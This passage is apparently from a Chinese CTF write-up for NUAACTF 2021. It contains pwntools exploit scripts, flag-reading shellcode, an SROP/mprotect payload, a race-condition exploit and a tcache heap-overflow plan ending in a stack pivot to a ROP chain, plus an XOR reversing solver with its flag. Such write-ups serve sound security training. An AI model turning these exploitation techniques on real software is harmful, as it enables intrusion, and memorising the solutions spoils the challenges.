    shellcode = ''' 
    mov rax,0x67616c662f2e
    push rax
    mov rdi,rsp
    mov rsi,0
    mov rdx,0
    mov rax,2
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov rdx,1024
    mov rax,0
    syscall
    mov rdi,1
    mov rsi,rsp
    mov rdx,rax
    mov rax,1
    syscall
    mov rdi,0
    mov rax,60
    syscall
    '''
    frame = SigreturnFrame()
    frame.rsp = heapbase + 0x10630 + 0x150
    frame.rdi = heapbase
    frame.rsi = 0x20000
    frame.rdx = 4 | 2 | 1
    frame.rip = mprotect_addr
    print str(frame)[0x28:]
    payload = p64(0x12345678) + p64(0x10630 + heapbase + 0x10) + p64(0x0) * 0x4 + p64(magic_addr) + str(frame)[0x28:]
    payload = payload.ljust(0x150, 'a')
    gdb.attach(sh)
    Edit(20, payload + p64(heapbase + 0x10630 + 0x158) + asm(shellcode))
    # gdb.attach(sh, 'b * {0}'.format(Exchange_Addr))
    # Dele(201)
    # now = 1
    Dele(20)
    sh.interactive()
###  总结
题目出的新颖，巧妙利用二叉树合并的过程制造UAF漏洞，题目还加了基础check来检测节点是否合法，将栈迁移到堆上进行rop去orw。不能getshell的前提下可以修改freehook为setcontext去在堆上制造orw读取flag。
## PWN -> thread (线程、临界资源)
###  题目分析
ida打开程序可以看到初始balance=1000，当balance>10001的时候，会读取flag，再看sale函数是按原价的9折卖出的，根本不可能大于1000，此时注意到sale函数中
    void *Sale_Handler(void *arg)
    {
        balance += Size * 90;
        sleep(1);
        Size = 0;
    }
加上balance后sleep(1),之后才size =
0，而且程序是用线程处理的，可以实现买一次，在1秒内卖两次就可以使得balance>1000,从而换取读取flag
    void Buy_Flag()
    {
        if (balance >= 1001)
        {
            int fd = open("./flag", 0);
            char buf[0x30];
            read(fd, buf, 0x30);
            write(1, buf, 0x30);
            close(fd);
            balance -= 1001;
        }
        else
        {
            puts("Your don't have enough money!");
        }
    }
###  利用
写脚本，买一次卖两次，之后换取flag
###  exp
存在随机性，多运行几次。
    from pwn import * 
    context.log_level = 'debug'
    sh = process('./thread')
    #sh = remote('119.45.24.140', 9373)
    sh.sendline('1')
    sleep(0.05)
    sh.sendline('10')
    sleep(0.05)
    sh.sendline('2')
    #sleep(0.05)
    sh.sendline('2')
    #sleep(0.05)
    sh.sendline('4')
    sh.interactive()
###  总结
拿到题目的时候分析，没有全面的思考，一直在整数溢出的地方尝试，发现不行，没有注意到sale函数的sleep(1)的作用，做题思路一定要发散，不能墨守成规。注意审题！
## PWN -> noleak (堆溢出、close(1)、orw)
###  题目分析
保护全开，环境2.31，题目给了libc和程序，但是发现运行程序没有输出，ida查看：  
init函数：
    __int64 sub_14A8()
    {
      unsigned int v0; // eax
      int v1; // eax
      __int64 v3; // [rsp+8h] [rbp-8h]
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      v0 = time(0LL);
      srand(v0);
      v1 = rand();
      malloc(10 * (v1 % 16) + 16);
      v3 = seccomp_init(0x7FFF0000LL);
      seccomp_rule_add(v3, 0LL, 59LL, 0LL);
      return seccomp_load(v3);
    }
随机申请内存，沙箱禁用59号调用。  
程序关闭了标准输出流close(1),main函数：
    void __fastcall main(__int64 a1, char **a2, char **a3)
    {
      unsigned int v3; // [rsp+Ch] [rbp-4h]
      init_0();
      printf("a gift from Asuri: %x\n", (unsigned __int16)&printf);
      puts("in return for the gift, you can't get any output on your screen");
      puts("how can you leak my info this time");
      close(1);    
      while ( 1 )
      {
        v3 = sub_1458();
        if ( v3   
add函数只检查了idx 0x60 )
        return puts("too big");
      if ( size_4 > 0x1F )
        return puts("out of range");
      ((void (*)(void))((char *)&sub_1318 + 1))();
      v3 = malloc(size);
      readn(v3, size);
      qword_4080[size_4] = v3;
      result = size;
      dword_4180[size_4] = size;
      return result;
    }
readn函数:
    unsigned __int64 __fastcall sub_136E(__int64 a1, unsigned int a2)
    {
      char buf; // [rsp+13h] [rbp-Dh] BYREF
      unsigned int i; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      *(_BYTE *)(a2 - 1LL + a1) = 0;
      for ( i = 0; i 
      {
        read(0, &buf, 1uLL);
        if ( buf == 10 )
          return __readfsqword(0x28u) ^ v5;
        *(_BYTE *)(a1 + i) = buf;
      }
      ((void (*)(void))((char *)&sub_1318 + 1))();
      return __readfsqword(0x28u) ^ v5;
    }
当size=0时，malloc申请0x20大小的chunk，但是输入的时候undigested int a2-1就会是很大的正数导致堆溢出。
###  利用思路
存在沙箱不能回去shell，只能orw读取flag，在此之前需要泄露地址，应先修改fileno=2，标准输出流（stdout）指向stderr实现输出，之后制造chunk
overlap利用unsortedbin泄露libc，用tcache attack泄露heap地址和environ地址（stack
address），然后再堆上布置orw的rop链，由于程序最大能读入0x60大小的内容，所以应多次利用tcache attack
分段申请chunk向heap里写入orw rop，最后将栈迁移到heap完成利用。  
注意：由于沙箱函数在初始化的时候会申请和释放很多chunk，所以早布置对的时候最好把堆填充清理一下。  
 **步骤：**
  1. 申请一些沙箱初始化过程中free的chunk，有助于布置堆
  2. add一个size=0的chunk和一些用于overlap的chunk，edit(0)利用堆溢出实现chunk overlap
  3. free两个0x70的chunk用于修改fileno，再free(1)将chunk放入unsortedbin
  4. 制造unsortedbin和tcache指向同一个地址，申请unsortedbin去修改tcache链指向
  5. edit(0)通过堆溢出实现堆块大小再分配并向chunk2处写入fileno偏移，tcache attack实现stdout->stderr
  6. 在unsortedbin里malloc chunk，leak libc，此时chunk2和unsortedbin的chunk1指向同一个地址
  7. 通过tcache attack leak heapaddress and stackaddress
  8. 向heap写入./flag，将orw rop分段写入heap
  9. 程序返回时将栈迁移到heap的orw处读取flag文件
###  总结
这道题目也是调试了好长时间，理清了其中的利用思路，由于关闭了stdout，脚本在利用的时候会出现乱序或者申请数量不对的情况，需要多运行几次，了解了重定向stdout->stderr的方法，orw和栈迁移。
## Re -> Warm up (xor)
一个很简单的逆向，程序加了反调试，不过静态看也完全够了，ida分析可知只是在 construct 过程中加了另一个异或和反调试。
    unsigned __int64 sub_84A()
    {
      int i; // [rsp+Ch] [rbp-14h]
      unsigned __int64 v2; // [rsp+18h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      for ( i = 0; i <= 33; ++i )
        s1[i] ^= 2 * i + 65;
      return __readfsqword(0x28u) ^ v2;
    }
    unsigned __int64 sub_8C3()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
      v1 = __readfsqword(0x28u);
      if ( ptrace(PTRACE_TRACEME, 0LL, 1LL, 0LL) < 0 )
      {
        while ( 1 )
          ;
      }
      return __readfsqword(0x28u) ^ v1;
    }
就是一个亦或,exp如下：
    s2=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46, 
      0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C, 
      0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43, 
      0x2B, 0x26, 0x89, 0xFE, 0x00]
    s1 = 'qasxcytgsasxcvrefghnrfghnjedfgbhn'
    print(len(s1))
    for i in range(len(s1)+1):
      print(chr(ord(s1[i])^ (2 * i + 65)^s2[i]),end='')
    # flag{c0n5truct0r5_functi0n_in_41f}
## 源码附件&wp
[NUAACTF源码](https://github.com/Asuri-Team/NUAACTF2021-Challenges)
[附件wp](https://github.com/1094093288/IMG/tree/master/Pwn/2021NUAACTF)